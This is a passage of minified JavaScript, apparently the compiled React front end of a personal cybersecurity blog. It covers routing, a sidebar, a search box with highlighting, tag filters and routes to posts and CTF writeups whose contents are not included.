0===t&&(t="/");let{pathname:n,search:a="",hash:i=""}="string"===typeof e?f(e):e,r=n?n.startsWith("/")?n:function(e,t){let n=t.replace(/\/+$/,"").split("/");return e.split("/").forEach((e=>{".."===e?n.length>1&&n.pop():"."!==e&&n.push(e)})),n.length>1?n.join("/"):"/"}(n,t):t;return{pathname:r,search:F(a),hash:U(i)}}(i,r),d=l&&"/"!==l&&l.endsWith("/"),p=(o||"."===l)&&n.endsWith("/");return u.pathname.endsWith("/")||!d&&!p||(u.pathname+="/"),u}const O=e=>e.join("/").replace(/\/\/+/g,"/"),_=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),F=e=>e&&"?"!==e?e.startsWith("?")?e:"?"+e:"",U=e=>e&&"#"!==e?e.startsWith("#")?e:"#"+e:"";Error;function W(e){return null!=e&&"number"===typeof e.status&&"string"===typeof e.statusText&&"boolean"===typeof e.internal&&"data"in e}const q=["post","put","patch","delete"],B=(new Set(q),["get",...q]);new Set(B),new Set([301,302,303,307,308]),new Set([307,308]);Symbol("deferred");function H(){return H=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},H.apply(this,arguments)}const V=t.createContext(null);const $=t.createContext(null);const G=t.createContext(null);const X=t.createContext(null);const Q=t.createContext({outlet:null,matches:[],isDataRoute:!1});const Y=t.createContext(null);function J(){return null!=t.useContext(X)}function K(){return J()||c(!1),t.useContext(X).location}function Z(e){t.useContext(G).static||t.useLayoutEffect(e)}function ee(){let{isDataRoute:e}=t.useContext(Q);return e?function(){let{router:e}=de(ce.UseNavigateStable),n=he(ue.UseNavigateStable),a=t.useRef(!1);return Z((()=>{a.current=!0})),t.useCallback((function(t,i){void 0===i&&(i={}),a.current&&("number"===typeof t?e.navigate(t):e.navigate(t,H({fromRouteId:n},i)))}),[e,n])}():function(){J()||c(!1);let e=t.useContext(V),{basename:n,future:a,navigator:i}=t.useContext(G),{matches:r}=t.useContext(Q),{pathname:o}=K(),s=JSON.stringify(M(r,a.v7_relativeSplatPath)),l=t.useRef(!1);return Z((()=>{l.current=!0})),t.useCallback((function(t,a){if(void 0===a&&(a={}),!l.current)return;if("number"===typeof t)return void i.go(t);let r=z(t,JSON.parse(s),o,"path"===a.relative);null==e&&"/"!==n&&(r.pathname="/"===r.pathname?n:O([n,r.pathname])),(a.replace?i.replace:i.push)(r,a.state,a)}),[n,i,s,o,e])}()}function te(){let{matches:e}=t.useContext(Q),n=e[e.length-1];return n?n.params:{}}function ne(e,n){let{relative:a}=void 0===n?{}:n,{future:i}=t.useContext(G),{matches:r}=t.useContext(Q),{pathname:o}=K(),s=JSON.stringify(M(r,i.v7_relativeSplatPath));return t.useMemo((()=>z(e,JSON.parse(s),o,"path"===a)),[e,s,o,a])}function ae(n,a,i,r){J()||c(!1);let{navigator:o}=t.useContext(G),{matches:s}=t.useContext(Q),l=s[s.length-1],u=l?l.params:{},d=(l&&l.pathname,l?l.pathnameBase:"/");l&&l.route;let p,h=K();if(a){var m;let e="string"===typeof a?f(a):a;"/"===d||(null==(m=e.pathname)?void 0:m.startsWith(d))||c(!1),p=e}else p=h;let g=p.pathname||"/",b=g;if("/"!==d){let e=d.replace(/^\//,"").split("/");b="/"+g.replace(/^\//,"").split("/").slice(e.length).join("/")}let w=y(n,{pathname:b});let v=le(w&&w.map((e=>Object.assign({},e,{params:Object.assign({},u,e.params),pathname:O([d,o.encodeLocation?o.encodeLocation(e.pathname).pathname:e.pathname]),pathnameBase:"/"===e.pathnameBase?d:O([d,o.encodeLocation?o.encodeLocation(e.pathnameBase).pathname:e.pathnameBase])}))),s,i,r);return a&&v?t.createElement(X.Provider,{value:{location:H({pathname:"/",search:"",hash:"",state:null,key:"default"},p),navigationType:e.Pop}},v):v}function ie(){let e=function(){var e;let n=t.useContext(Y),a=pe(ue.UseRouteError),i=he(ue.UseRouteError);if(void 0!==n)return n;return null==(e=a.errors)?void 0:e[i]}(),n=W(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),a=e instanceof Error?e.stack:null,i="rgba(200,200,200, 0.5)",r={padding:"0.5rem",backgroundColor:i};return t.createElement(t.Fragment,null,t.createElement("h2",null,"Unexpected Application Error!"),t.createElement("h3",{style:{fontStyle:"italic"}},n),a?t.createElement("pre",{style:r},a):null,null)}const re=t.createElement(ie,null);class oe extends t.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||"idle"!==t.revalidation&&"idle"===e.revalidation?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:void 0!==e.error?e.error:t.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){console.error("React Router caught the following error during render",e,t)}render(){return void 0!==this.state.error?t.createElement(Q.Provider,{value:this.props.routeContext},t.createElement(Y.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function se(e){let{routeContext:n,match:a,children:i}=e,r=t.useContext(V);return r&&r.static&&r.staticContext&&(a.route.errorElement||a.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=a.route.id),t.createElement(Q.Provider,{value:n},i)}function le(e,n,a,i){var r;if(void 0===n&&(n=[]),void 0===a&&(a=null),void 0===i&&(i=null),null==e){var o;if(!a)return null;if(a.errors)e=a.matches;else{if(!(null!=(o=i)&&o.v7_partialHydration&&0===n.length&&!a.initialized&&a.matches.length>0))return null;e=a.matches}}let s=e,l=null==(r=a)?void 0:r.errors;if(null!=l){let e=s.findIndex((e=>e.route.id&&void 0!==(null==l?void 0:l[e.route.id])));e>=0||c(!1),s=s.slice(0,Math.min(s.length,e+1))}let u=!1,d=-1;if(a&&i&&i.v7_partialHydration)for(let t=0;t<s.length;t++){let e=s[t];if((e.route.HydrateFallback||e.route.hydrateFallbackElement)&&(d=t),e.route.id){let{loaderData:t,errors:n}=a,i=e.route.loader&&void 0===t[e.route.id]&&(!n||void 0===n[e.route.id]);if(e.route.lazy||i){u=!0,s=d>=0?s.slice(0,d+1):[s[0]];break}}}return s.reduceRight(((e,i,r)=>{let o,c=!1,p=null,h=null;var f;a&&(o=l&&i.route.id?l[i.route.id]:void 0,p=i.route.errorElement||re,u&&(d<0&&0===r?(f="route-fallback",!1||fe[f]||(fe[f]=!0),c=!0,h=null):d===r&&(c=!0,h=i.route.hydrateFallbackElement||null)));let m=n.concat(s.slice(0,r+1)),g=()=>{let n;return n=o?p:c?h:i.route.Component?t.createElement(i.route.Component,null):i.route.element?i.route.element:e,t.createElement(se,{match:i,routeContext:{outlet:e,matches:m,isDataRoute:null!=a},children:n})};return a&&(i.route.ErrorBoundary||i.route.errorElement||0===r)?t.createElement(oe,{location:a.location,revalidation:a.revalidation,component:p,error:o,children:g(),routeContext:{outlet:null,matches:m,isDataRoute:!0}}):g()}),null)}var ce=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(ce||{}),ue=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(ue||{});function de(e){let n=t.useContext(V);return n||c(!1),n}function pe(e){let n=t.useContext($);return n||c(!1),n}function he(e){let n=function(){let e=t.useContext(Q);return e||c(!1),e}(),a=n.matches[n.matches.length-1];return a.route.id||c(!1),a.route.id}const fe={};a.startTransition;function me(e){c(!1)}function ge(n){let{basename:a="/",children:i=null,location:r,navigationType:o=e.Pop,navigator:s,static:l=!1,future:u}=n;J()&&c(!1);let d=a.replace(/^\/*/,"/"),p=t.useMemo((()=>({basename:d,navigator:s,static:l,future:H({v7_relativeSplatPath:!1},u)})),[d,u,s,l]);"string"===typeof r&&(r=f(r));let{pathname:h="/",search:m="",hash:g="",state:y=null,key:b="default"}=r,w=t.useMemo((()=>{let e=D(h,d);return null==e?null:{location:{pathname:e,search:m,hash:g,state:y,key:b},navigationType:o}}),[d,h,m,g,y,b,o]);return null==w?null:t.createElement(G.Provider,{value:p},t.createElement(X.Provider,{children:i,value:w}))}function ye(e){let{children:t,location:n}=e;return ae(be(t),n)}new Promise((()=>{}));t.Component;function be(e,n){void 0===n&&(n=[]);let a=[];return t.Children.forEach(e,((e,i)=>{if(!t.isValidElement(e))return;let r=[...n,i];if(e.type===t.Fragment)return void a.push.apply(a,be(e.props.children,r));e.type!==me&&c(!1),e.props.index&&e.props.children&&c(!1);let o={id:e.props.id||r.join("-"),caseSensitive:e.props.caseSensitive,element:e.props.element,Component:e.props.Component,index:e.props.index,path:e.props.path,loader:e.props.loader,action:e.props.action,errorElement:e.props.errorElement,ErrorBoundary:e.props.ErrorBoundary,hasErrorBoundary:null!=e.props.ErrorBoundary||null!=e.props.errorElement,shouldRevalidate:e.props.shouldRevalidate,handle:e.props.handle,lazy:e.props.lazy};e.props.children&&(o.children=be(e.props.children,r)),a.push(o)})),a}function we(){return we=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},we.apply(this,arguments)}function ve(e,t){if(null==e)return{};var n,a,i={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);const ke=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","unstable_viewTransition"];try{window.__reactRouterVersion="6"}catch(tt){}new Map;const xe=a.startTransition;o.flushSync,a.useId;function Se(e){let{basename:n,children:a,future:i,window:r}=e,o=t.useRef();var s;null==o.current&&(o.current=(void 0===(s={window:r,v5Compat:!0})&&(s={}),m((function(e,t){let{pathname:n="/",search:a="",hash:i=""}=f(e.location.hash.substr(1));return n.startsWith("/")||n.startsWith(".")||(n="/"+n),p("",{pathname:n,search:a,hash:i},t.state&&t.state.usr||null,t.state&&t.state.key||"default")}),(function(e,t){let n=e.document.querySelector("base"),a="";if(n&&n.getAttribute("href")){let t=e.location.href,n=t.indexOf("#");a=-1===n?t:t.slice(0,n)}return a+"#"+("string"===typeof t?t:h(t))}),(function(e,t){u("/"===e.pathname.charAt(0),"relative pathnames are not supported in hash history.push("+JSON.stringify(t)+")")}),s)));let l=o.current,[c,d]=t.useState({action:l.action,location:l.location}),{v7_startTransition:g}=i||{},y=t.useCallback((e=>{g&&xe?xe((()=>d(e))):d(e)}),[d,g]);return t.useLayoutEffect((()=>l.listen(y)),[l,y]),t.createElement(ge,{basename:n,children:a,location:c.location,navigationType:c.action,navigator:l,future:i})}const Ie="undefined"!==typeof window&&"undefined"!==typeof window.document&&"undefined"!==typeof window.document.createElement,Ee=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Pe=t.forwardRef((function(e,n){let a,{onClick:i,relative:r,reloadDocument:o,replace:s,state:l,target:u,to:d,preventScrollReset:p,unstable_viewTransition:f}=e,m=ve(e,ke),{basename:g}=t.useContext(G),y=!1;if("string"===typeof d&&Ee.test(d)&&(a=d,Ie))try{let e=new URL(window.location.href),t=d.startsWith("//")?new URL(e.protocol+d):new URL(d),n=D(t.pathname,g);t.origin===e.origin&&null!=n?d=n+t.search+t.hash:y=!0}catch(tt){}let b=function(e,n){let{relative:a}=void 0===n?{}:n;J()||c(!1);let{basename:i,navigator:r}=t.useContext(G),{hash:o,pathname:s,search:l}=ne(e,{relative:a}),u=s;return"/"!==i&&(u="/"===s?i:O([i,s])),r.createHref({pathname:u,search:l,hash:o})}(d,{relative:r}),w=function(e,n){let{target:a,replace:i,state:r,preventScrollReset:o,relative:s,unstable_viewTransition:l}=void 0===n?{}:n,c=ee(),u=K(),d=ne(e,{relative:s});return t.useCallback((t=>{if(function(e,t){return 0===e.button&&(!t||"_self"===t)&&!function(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}(e)}(t,a)){t.preventDefault();let n=void 0!==i?i:h(u)===h(d);c(e,{replace:n,state:r,preventScrollReset:o,relative:s,unstable_viewTransition:l})}}),[u,c,d,i,r,a,e,o,s,l])}(d,{replace:s,state:l,target:u,preventScrollReset:p,relative:r,unstable_viewTransition:f});return t.createElement("a",we({},m,{href:a||b,onClick:y||o?i:function(e){i&&i(e),e.defaultPrevented||w(e)},ref:n,target:u}))}));var Te,Ce;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Te||(Te={})),function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"}(Ce||(Ce={}));const Ae=n.p+"static/media/avatar.b27e125d69a35bf03e71.jpg";var je=n(579);const Le=()=>{const[e,n]=(0,t.useState)(!1);return(0,je.jsxs)("div",{children:[(0,je.jsx)("div",{className:"burger-menu",onClick:()=>{n(!e)},children:"\u2630 "}),(0,je.jsxs)("div",{className:"sidebarLeft "+(e?"open":""),children:[(0,je.jsx)("div",{className:"avatar",children:(0,je.jsx)("img",{src:Ae,alt:"Avatar"})}),(0,je.jsxs)("ul",{children:[(0,je.jsx)(Pe,{to:"/",children:(0,je.jsx)("li",{children:"Home"})}),(0,je.jsx)(Pe,{to:"/Cyber",children:(0,je.jsx)("li",{children:"Search"})}),(0,je.jsx)(Pe,{to:"/Blog",children:(0,je.jsx)("li",{children:"Blog"})}),(0,je.jsx)(Pe,{to:"/Writeups",children:(0,je.jsx)("li",{children:"Writeups"})}),(0,je.jsx)(Pe,{to:"",children:(0,je.jsx)("li",{style:{color:"#555555"},children:"Resources"})}),(0,je.jsx)(Pe,{to:"",children:(0,je.jsx)("li",{style:{color:"#555555"},children:"Contact"})})]})]})]})};var De=n(110),Ne=n(302);const Re=()=>{const[e,a]=(0,t.useState)(""),[i,r]=(0,t.useState)(!0),[o,s]=(0,t.useState)(!0);let l=[];i&&De.files.forEach((e=>{const t=n(24)(`./${e}`),a=t.title;t.search.forEach((e=>{l.push([a,e])}))})),o&&Ne.files.forEach((e=>{const t=n(24)(`./${e}`),a=t.title;t.search.forEach((e=>{l.push([a,e])}))}));const c=l.filter((t=>{if(!e)return!1;const n=t[1].description.toLowerCase();var a=e.toLowerCase().split(" ");return(a=a.filter((e=>""!==e))).every((e=>n.includes(e)))}));return(0,je.jsxs)("div",{children:[(0,je.jsxs)("h2",{children:[(0,je.jsx)("span",{style:{color:"#da1953"},children:"Sea"}),"rch (beta test)"]}),(0,je.jsx)("br",{}),(0,je.jsxs)("div",{className:"tagfilteroption",children:[(0,je.jsxs)("p",{children:[(0,je.jsx)("input",{type:"checkbox",name:"Show Blog Posts",checked:o,onChange:()=>s(!o)}),(0,je.jsx)("label",{children:" Show Blog Posts "}),"\xa0",(0,je.jsx)("input",{type:"checkbox",name:"Show Writeups",checked:i,onChange:()=>r(!i)}),(0,je.jsx)("label",{children:" Show Writeups"})]}),(0,je.jsx)("p",{children:(0,je.jsx)("input",{type:"text",value:e,onChange:e=>{a(e.target.value)},placeholder:"ENTER SEARCH TERM"})})]}),(0,je.jsx)("div",{children:c.length>0?c.map(((t,n)=>{const a=t[1].description;var i=e.toLowerCase().split(" ");const r=function(e,t){let n=e;const a=["#FFFF00","#FF80AB","#f7f1b2","#4CAF50","#64B5F6","#FF7043","#9C27B0","#FF9800","#8BC34A","#9E9E9E"];return t.forEach(((e,t)=>{const a=new RegExp(`(${e})`,"gi");n=n.replace(a,`\x3c!---${t}--\x3e$1\x3c!--/-${t}--\x3e`)})),t.forEach(((e,t)=>{const i=`<span style="background: ${a[t%a.length]};">`;n=n.replace(new RegExp(`\x3c!---${t}--\x3e`,"g"),i).replace(new RegExp(`\x3c!--/-${t}--\x3e`,"g"),"</span>")})),n}(a,i=i.filter((e=>""!==e)));return(0,je.jsxs)("div",{children:[console.log(t[0],"|",t[1].section,"|","/"+t[0]+"/"+t[1].section),(0,je.jsx)(Pe,{to:"/"+t[0]+"/"+t[1].section,children:t[0]})," : ",(0,je.jsx)("span",{dangerouslySetInnerHTML:{__html:r}})]},n)})):e&&(0,je.jsx)("p",{children:"No results found"})})]})};const Me=function(){return(0,je.jsx)("div",{className:"App",children:(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",style:{paddingTop:"50px"},children:(0,je.jsxs)("div",{className:"Post",children:[(0,je.jsxs)("h1",{children:["The portfolio is under ongoing developmenty.",(0,je.jsx)("br",{}),"Check the blog for interesting content about Cybersecurity",(0,je.jsx)("br",{}),(0,je.jsx)("br",{}),"I am working on blogposts about Penetration Testing,",(0,je.jsx)("br",{})," Cyber Risk Management, It Audit and more."]}),(0,je.jsx)("br",{}),(0,je.jsx)("h3",{children:"Completes Updates:"}),"- Post style",(0,je.jsx)("br",{}),"- Improved the readability of the post",(0,je.jsx)("br",{}),"- Added banners for grafical readers and easy to remember about post",(0,je.jsx)("br",{}),"- Calculated estemited reading time",(0,je.jsx)("br",{}),"- Added navigation panel at the right side for easy navigation in long post/witeups",(0,je.jsx)("br",{}),"- Tag filters for post and writeups available on desktop and large screens",(0,je.jsx)("br",{}),"- Search bar similat to ippsec.rocks to search and find writeups sections and accurate searching command line and information used in previews CTFs",(0,je.jsx)("br",{}),"- Addedd highlighting to search result",(0,je.jsx)("br",{}),"- Python code highlighting",(0,je.jsx)("h3",{children:"In development:"}),"- restiling mobile burger menu",(0,je.jsx)("br",{}),"- dark theme",(0,je.jsx)("br",{}),"- Continous updatin minor graphical styling and color palette",(0,je.jsx)("br",{}),(0,je.jsx)("h3",{children:"TODO"}),"- Search substring vs whole word - Master Resume",(0,je.jsx)("br",{}),"- Contact page",(0,je.jsx)("br",{}),"- Resource page containing pentesting tools and more",(0,je.jsx)("hr",{}),(0,je.jsx)(Re,{}),(0,je.jsx)("br",{}),(0,je.jsx)("br",{})]})})]})})},ze=e=>{var t="";const n=e=>{"string"!==typeof e?e.body.forEach((e=>{"string"===typeof e?n(e):e.body.forEach((e=>{"undefined"!==typeof e&&n(e)}))})):t+=e+" "};n(e.postname);var a=void 0!==t.match(/<img\b[^>]*>/gi)&&null!==t.match(/<img\b[^>]*>/gi)?t.match(/<img\b[^>]*>/gi).length:0,i=t.split(" ").length;return(0,je.jsxs)("div",{className:"readingtime",children:["Reading: ",(0,je.jsxs)("i",{children:[parseInt((i+35*a)/180),"min ",Math.floor((i+35*a)/200%1*.6*100),"sec "]})]})},Oe=e=>(console.log(e),e.lst.map((e=>(0,je.jsxs)(Pe,{to:`/${e.title}/null`,children:[(0,je.jsxs)("div",{className:"my-single-menu",children:[(0,je.jsx)("img",{style:{border:"0px"},src:"/cyber/"+e.banner}),e.title,(0,je.jsx)("post-date",{children:(0,je.jsx)(ze,{postname:e})})]}),(0,je.jsx)("br",{}),(0,je.jsx)("br",{})]})))),_e=()=>{var e=n(302).files,t=[];return e.forEach((e=>{var a=n(24)("./"+e);"blog"===a.type&&t.push(a)})),(0,je.jsx)("div",{className:"App",children:(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsxs)("div",{className:"Post",children:[(0,je.jsxs)("h2",{children:[(0,je.jsx)("span",{style:{color:"#da1953"},children:"Blo"}),"g Index"]}),(0,je.jsx)("br",{}),(0,je.jsx)(Oe,{lst:t})]})})]})})},Fe=e=>{const{section:a}=te(),i=(0,t.useRef)({});let r=n(24)(`./${e.postname}`);const[o,s]=(0,t.useState)(!1),l=e=>e&&Array.isArray(e.body)?e.body.map(((t,n)=>"string"===typeof t?(0,je.jsx)("div",{dangerouslySetInnerHTML:{__html:t}},`${e.id}-${n}`):"object"===typeof t&&t.body?(0,je.jsxs)("div",{id:t.id,ref:e=>{e&&(i.current[t.id]=e)},children:[t.title&&(0,je.jsx)("div",{dangerouslySetInnerHTML:{__html:t.title}}),l(t)]},t.id||n):null)):null;return(0,t.useEffect)((()=>{const e=setTimeout((()=>{s(!0)}),400);return()=>clearTimeout(e)}),[]),(0,t.useEffect)((()=>{o&&a&&i.current[a]&&i.current[a].scrollIntoView({behavior:"smooth"})}),[o,a]),(0,je.jsxs)("div",{children:[l(r)," "]})},Ue=()=>(0,je.jsxs)("center",{children:[(0,je.jsx)("div",{className:"introcard"}),(0,je.jsxs)("div",{className:"portfolio",children:[(0,je.jsx)("div",{className:"leftside",children:(0,je.jsx)(Pe,{to:"/Cyber",children:(0,je.jsx)("button",{type:"button",children:"CYBER BLOG"})})}),(0,je.jsx)("div",{className:"rightside",children:(0,je.jsx)("button",{type:"button",children:"PHOTOGRAPHY PORTFOLIO"})})]})]}),We=e=>{var t=e.mystyle,a=(e=>{var t=n(24)("./"+e.postname),a=t.body,i=t.title,r=[],o=window.innerWidth<=1280?1:2;const s=(e,t)=>{void 0===e.body&&e.forEach((e=>{"undefined"!==typeof e.id&&t>0&&t<=o&&"banner"!==e.id&&r.push([e.id,t]),"object"==typeof e.body&&s(e.body,t+1)}))};return s(a,0),(0,je.jsx)("div",{children:r.map((e=>(0,je.jsxs)(Pe,{style:{fontSize:16-2*(e[1]-1)+"px",marginLeft:20*(e[1]-1)+"px"},to:"/"+i+"/"+e[0],children:[e[0],(0,je.jsx)("br",{})]})))})})(e),i=n(24)("./"+e.postname).tags;/TagFilter*/.test(K().pathname);return/TagFilter*/.test(K().pathname)&&(t={width:"500px",position:"fixed"}),(0,je.jsx)("div",{className:"sidebarRight",style:t||{},children:(0,je.jsxs)("div",{className:"sidebarRightChild",children:[(0,je.jsx)("h2",{children:"Index"}),a,(0,je.jsx)("br",{}),(0,je.jsx)("h2",{children:"Tags"}),(0,je.jsx)("div",{className:"tags",children:i.map((e=>(0,je.jsx)(Pe,{to:`/TagFilter/${e}`,style:{marginTop:10},children:(0,je.jsx)("my-tag",{children:e})})))})]})})},qe=e=>(console.log(e),(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"blogdb/i-hacked-my-wifi.json"})})}),(0,je.jsx)(We,{postname:"blogdb/i-hacked-my-wifi.json"})]})),Be=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"blogdb/manual-unpacking-upx-and-mpress.json"})})}),(0,je.jsx)(We,{postname:"blogdb/manual-unpacking-upx-and-mpress.json"})]}),He=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"blogdb/malware-thesis.json"})})}),(0,je.jsx)(We,{postname:"blogdb/malware-thesis.json",mystyle:{marginTop:"0px",height:"100%"}})]}),Ve=e=>{let{onTest:t}=e;var a=n(302).files,i=n(110).files,r=[],o=[];const s=e=>{const n=e.target.innerText.slice(0,-1).trim();t&&t(n)};a.forEach((e=>{var t=n(24)("./"+e).tags;r=r.concat(t)}));r=Array.from(new Set(r));i.forEach((e=>{var t=n(24)("./"+e).tags;o=o.concat(t)}));var l=Array.from(new Set(o.concat(r)));return l.sort(((e,t)=>e.toLowerCase().localeCompare(t.toLowerCase()))),(0,je.jsx)("div",{className:"allfilter",children:(0,je.jsxs)("div",{className:"allfilterchild",children:[(0,je.jsx)("h2",{children:"Add Filter Tags"}),(0,je.jsx)("div",{className:"tags",children:l.map((e=>(0,je.jsx)("button",{onClick:s,children:(0,je.jsxs)("my-tag",{children:[e,(0,je.jsx)("sup",{children:"+"})]})},e)))})]})})},$e=()=>{const{tag:e}=te();var a=n(302).files,i=n(110).files,r=[],o=[],[s,l]=(0,t.useState)([e]);const[c,u]=(0,t.useState)(!0),[d,p]=(0,t.useState)(!0),h=e=>{var t=e.target.innerText.slice(0,-1).trim();s=s.filter((e=>e!==t)),l([...s])};var f={};return/TagFilter*/.test(K().pathname)&&(f={width:"600px"}),a.forEach((e=>{var t=n(24)("./"+e),a=1;s.forEach((e=>{t.tags.includes(e)||(a=0)})),a&&r.push(t)})),i.forEach((e=>{var t=n(24)("./"+e),a=1;s.forEach((e=>{t.tags.includes(e)||(a=0)})),a&&o.push(t)})),(0,t.useEffect)((()=>{window.scrollTo(0,0)}),[]),(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsxs)("div",{className:"content",children:[(0,je.jsxs)("div",{className:"Post",style:f||{},children:[(0,je.jsxs)("h2",{children:[(0,je.jsx)("span",{style:{color:"#da1953"},children:"Ind"}),"ex"]}),(0,je.jsx)("br",{}),(0,je.jsxs)("div",{className:"tagfilteroption",children:[(0,je.jsxs)("p",{children:[(0,je.jsx)("input",{type:"checkbox",name:"Show Blog Posts",checked:c,onChange:()=>u(!c)}),(0,je.jsx)("label",{children:" Show Blog Posts "}),"\xa0",(0,je.jsx)("input",{type:"checkbox",name:"Show Writeups",checked:d,onChange:()=>p(!d)}),(0,je.jsx)("label",{children:" Show Writeups"})]}),(0,je.jsxs)("p",{children:[(0,je.jsx)("i",{children:"Click a filter to remove it."}),(0,je.jsx)("br",{}),"Searching for tag(s): "]}),s.map((e=>(0,je.jsx)("button",{onClick:h,children:(0,je.jsxs)("my-tag",{children:[e,(0,je.jsx)("sup",{children:"x"})]})},e)))]}),(0,je.jsx)("br",{}),(0,je.jsx)("br",{}),c&&(0,je.jsx)(Oe,{lst:r}),d&&(0,je.jsx)(Oe,{lst:o})]}),(0,je.jsx)(Ve,{onTest:e=>{!s.includes(e)&&e&&s.push(e),l([...s])}})]})]})},Ge=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"blogdb/run-and-debug-dll.json"})})}),(0,je.jsx)(We,{postname:"blogdb/run-and-debug-dll.json"})]}),Xe=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"blogdb/cybersecurity-in-the-sea.json"})})}),(0,je.jsx)(We,{postname:"blogdb/cybersecurity-in-the-sea.json"})]}),Qe=()=>{var e=n(110).files,t=[];return e.forEach((e=>{var a=n(24)("./"+e);"writeup"===a.type&&t.push(a)})),(0,je.jsx)("div",{className:"App",children:(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsxs)("div",{className:"Post",children:[(0,je.jsxs)("h2",{children:[(0,je.jsx)("span",{style:{color:"#da1953"},children:"Wri"}),"teup Index"]}),(0,je.jsx)("br",{}),(0,je.jsx)(Oe,{lst:t})]})})]})})},Ye=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"writeupdb/ignite.json"})})}),(0,je.jsx)(We,{postname:"writeupdb/ignite.json"})]}),Je=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"writeupdb/uni-ctf.json"})})}),(0,je.jsx)(We,{postname:"writeupdb/uni-ctf.json"})]}),Ke=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsxs)("div",{className:"SidebarRight",children:[(0,je.jsx)(We,{postname:"blogdb/test.json"}),(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"blogdb/test.json"})})]})})]}),Ze=()=>(0,je.jsxs)("div",{className:"Wrapper",children:[(0,je.jsx)(Le,{}),(0,je.jsx)("div",{className:"content",children:(0,je.jsx)("div",{className:"Post",children:(0,je.jsx)(Fe,{postname:"writeupdb/buff.json"})})}),(0,je.jsx)(We,{postname:"writeupdb/buff.json"})]}),et=()=>(0,je.jsx)("div",{children:(0,je.jsxs)(ye,{children:[(0,je.jsx)(me,{path:"/",element:(0,je.jsx)(Ue,{})}),(0,je.jsx)(me,{path:"/Cyber",element:(0,je.jsx)(Me,{})}),(0,je.jsx)(me,{path:"/Blog",element:(0,je.jsx)(_e,{})}),(0,je.jsx)(me,{path:"/Writeups",Component:Qe}),(0,je.jsx)(me,{path:"/I Hacked My WiFi/:section",element:(0,je.jsx)(qe,{})}),(0,je.jsx)(me,{path:"/A Review of Common Practices for Malware Unpacking/:section",Component:He}),(0,je.jsx)(me,{path:"/Run and Debug Dll/:section",Component:Ge}),(0,je.jsx)(me,{path:"/Manual Unpacking of UPX and MPRESS/:section",Component:Be}),(0,je.jsx)(me,{path:"/TagFilter/:tag",Component:$e}),(0,je.jsx)(me,{path:"/Cyber Security in the Sea",Component:Xe}),(0,je.jsx)(me,{path:"/Test/:section",Component:Ke}),(0,je.jsx)(me,{path:"/Ignite/:section",Component:Ye}),(0,je.jsx)(me,{path:"/Buff/:section",Component:Ze}),(0,je.jsx)(me,{path:"/University 